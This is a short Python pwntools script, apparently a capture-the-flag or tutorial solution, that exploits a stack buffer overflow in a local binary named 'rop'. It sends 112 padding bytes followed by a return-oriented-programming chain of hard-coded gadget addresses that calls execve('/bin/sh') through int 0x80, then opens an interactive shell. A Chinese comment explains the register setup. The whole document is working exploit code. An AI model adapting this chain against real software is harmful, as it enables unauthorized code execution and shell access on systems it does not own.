#!/usr/bin/env python
from pwn import *

sh = process('./rop')

pop_eax_ret = 0x080bb196
pop_edx_ecx_ebx_ret = 0x0806eb90
int_0x80 = 0x08049421
binsh = 0x80be408
payload = flat(
    [b'A' * 112, pop_eax_ret, 0xb, pop_edx_ecx_ebx_ret, 0, 0, binsh, int_0x80])
sh.sendline(payload)
sh.interactive()

# 使用了execve("/bin/sh", NULL, NULL); 其中0xb是execve的系统调用号，放入eax中，
# binsh放入ebx中，0，0分别放入ecx和edx，最后触发int 80h中断